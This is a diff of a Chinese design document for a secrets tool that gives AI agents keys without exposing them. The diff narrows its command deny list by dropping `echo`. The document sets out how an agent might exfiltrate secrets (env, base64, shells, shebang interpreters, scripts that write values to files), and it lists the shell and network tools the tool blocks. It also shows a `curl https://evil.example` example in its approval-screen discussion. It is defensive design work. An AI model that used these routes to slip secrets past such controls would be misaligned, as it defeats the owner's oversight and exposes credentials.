@@ -34,7 +34,7 @@ v0.2：自托管是一等部署，和官方托管共用一份服务器。费用�
 | 编辑权 | MVP 里只有 iOS owner 能创建、修改、删除、轮换。CLI 只读 |
 | 引用 | 每个条目有稳定的 `ref`（例如 `openai-prod`）。占位符是 `{{keyref:REF}}`（v0.6 起不再有 URI 等价写法） |
 | 注入 | 优先 `--env`、stdin、额外 fd / 打开后即删除的临时文件。进程参数注入必须显式 `--allow-argv`，且条目策略 `allowArgv = true` |
-| 执行 | CLI 直接 `posix_spawn` / `execve`，不经过 shell。已配对条目必须显式列出允许的命令（`allowCommands`，v2 H）；`echo`、`env`、`sh` 等的内置拒绝名单只用于本地源。shebang 间接换入的解释器同样检查（§7.3） |
+| 执行 | CLI 直接 `posix_spawn` / `execve`，不经过 shell。已配对条目必须显式列出允许的命令（`allowCommands`，v2 H）；`env`、`sh` 等的内置拒绝名单用于本地和 GitHub 账号库。shebang 间接换入的解释器同样检查（§7.3） |
 | 敏感条目 | `sensitivity = approval` 的条目不给 CLI 长期条目密钥。每次 `exec` 由手机批准后下发一次性包裹 |
 | 元数据 | 名称、描述、`ref`、策略、秘密值全部加密。服务器只看见 id、版本、密文、设备授权图。托管部署另外看见配额档位 |
 | 密码学 | AES-256-GCM 做数据加密；HPKE（RFC 9180）做密钥包裹；Secure Enclave 用 P-256；CLI 用 X25519 + Ed25519；恢复口令用 Argon2id |
@@ -110,7 +110,7 @@ Owner 设备是 `kind = ios`。Agent 设备是 `kind = cli`。只有 owner 设�
 | A1 | 网络窃听者 | TLS 之外仍然只能看到密文。窃听同步流量得不到秘密 |
 | A2 | 被入侵的同步服务运营方，或被迫交出数据库的人 | 有全部密文、授权图、时间戳，没有密钥就解不开。不能伪造 owner 的签名来通过诚实客户端的校验 |
 | A3 | 会写命令的 agent，工具结果会回到模型上下文 | `list` / `get` / `exec` 的回传里没有明文，也没有明文的常见编码 |
-| A4 | 试图用 `exec` 做外泄的 agent：`echo`、`env`、`base64`、启动 shell、把值写进文件再读、用 `#!` 脚本换入解释器 | 默认策略拒绝这些命令，含经 shebang 间接启动的解释器（§7.3）。秘密不进 shell 历史。默认不进进程参数 |
+| A4 | 试图用 `exec` 做外泄的 agent：`env`、`base64`、启动 shell、把值写进文件再读、用 `#!` 脚本换入解释器 | 默认策略拒绝这些命令，含经 shebang 间接启动的解释器（§7.3）。秘密不进 shell 历史。默认不进进程参数 |
 | A5 | 偷到上锁 iPhone 的人 | 没有 Face ID / 密码就解不开 Secure Enclave 里的包裹 |
 | A6 | 偷到服务器备份、但没有手机也没有恢复码的人 | 与 A2 相同 |
 | A7 | 把用户骗去扫别人的配对二维码 | 配对码要在手机和终端两边对得上；授予范围默认是空的，要人逐条勾选 |
@@ -571,12 +571,14 @@ keyref 掌握 pty 主端。子进程的输出先过脱敏器，再交给 agent�
 ```text
 sh bash zsh dash fish ksh csh tcsh busybox
 env printenv
-echo printf
+printf
 cat tee dd od xxd hexdump base64 base32
 openssl
 python python2 python3 node nodejs deno bun perl ruby php lua
 osascript socat
 ```
+
+`echo` 不在拒绝名单中：keyref 直接启动程序，不做 shell 变量展开；子进程输出仍经过脱敏。已配对库仍按条目的白名单判断 `echo`。
 
 两个 source 的判定都不能只看字面：`execve` 遇到以 `#!` 开头的可执行文件时，内核会把解释器换进来，字面 argv0 是脚本名，真正跑起来的是解释器。所以策略检查在 spawn 之前先做一遍解析：
 
@@ -586,7 +588,7 @@ osascript socat
 
 残余面：`binfmt_misc` 这类内核注册的解释器不在静态检查可见范围内，与 B2 归为同一类残余，不假装已封死。
 
-拒绝时退出码 `10`，说明是策略拒绝；错误文本里不回显秘密，并指出该改哪里（已配对库：在 iOS 上设置该条目的 `allowCommands`；本地源：内置名单没有旋钮）。
+拒绝时退出码 `10`，说明是策略拒绝；错误文本里不回显秘密。已配对库提示在 iOS 上设置条目的 `allowCommands`；内置名单提示支持该策略的来源可通过条目的 `allowCommands` 覆盖，本地源没有设置该策略的入口。
 
 `allowCommands` 是精确的名字匹配，不展开通配或前缀；检查覆盖解析链上的每一层，shebang 解释器也算。白名单是 owner 的判断：解释器一旦被允许，模型就可以用它把秘密切片打印，脱敏器会失明。所以对 `python`、`node`、`sh` 的显式放行应该和 `sensitivity = approval` 一起用；iOS 保存这类名字时会先给出红色警示。
 
@@ -641,7 +643,7 @@ osascript socat
 | `/proc/<pid>/environ`、macOS `ps e` | 与 argv 相比，环境变量不会被系统里所有用户在进程列表里看到，但同一用户可以读。这是 B2。文档把 env 排在 argv 前面，是因为暴露面更窄，不是因为 agent 读不到 |
 | 临时文件 | 0600、目录 0700、写入后 unlink |
 | 子进程把秘密写到磁盘，后续命令再读 | 已配对库只放行白名单里的命令，默认没有 `cat` / shell；本地源靠内置拒绝名单。若 harness 另有 shell，则属于 B2 |
-| `exec -- echo {{keyref:x}}` 或 `exec -- env` | 已配对库：不在条目白名单里就拒绝；本地源：命中内置拒绝名单 |
+| `exec -- echo ...` 或 `exec -- env` | 已配对库：不在条目白名单里就拒绝；本地源：允许 `echo`，拒绝 `env` |
 | CLI 日志、崩溃转储 | 不记录解开的值。关闭 core dump。密钥缓冲区尽力清零（§12.2） |
 | 交换分区 | 对密钥页 `mlock`，失败只记调试计数，不把秘密写进日志 |
 | 审批界面被模型骗 | 手机上展示的是 argv 原文、`ref`、条目名称、注入方式。人看到的是 `curl https://evil.example`，不是一个已经被替换成密钥的字符串 |
@@ -1242,7 +1244,7 @@ Go。一个模块，入口是 `keyref-server`。HTTP 用标准库，SQLite 用�
 - 审计加密上传，iOS 能查看。过期审计按档位删除
 - 跨语言 HPKE 测试向量
 - `keyref-server backup` 子命令、`GET /v1/healthz`、ACME 自动续期；官方托管配置免费拨测对 healthz 报警
-- 验收：夹具明文不出现在 CLI 输出里；`echo` / `env` / `sh` 被拒绝，`#!/bin/sh` 脚本同样被拒绝；服务器数据库转储里没有名称和秘密；把 CLI 指到本机 Docker 和指到官方托管，配对和 `exec` 走同一条协议；丢一台测试手机，凭恢复码在新设备完成接管并重新配对 CLI
+- 验收：夹具明文不出现在 CLI 输出里；已配对库中未列入白名单的 `echo` / `env` / `sh` 被拒绝，`#!/bin/sh` 脚本同样被拒绝；服务器数据库转储里没有名称和秘密；把 CLI 指到本机 Docker 和指到官方托管，配对和 `exec` 走同一条协议；丢一台测试手机，凭恢复码在新设备完成接管并重新配对 CLI
 
 ### Phase 2 — 审批、内购与交互
 
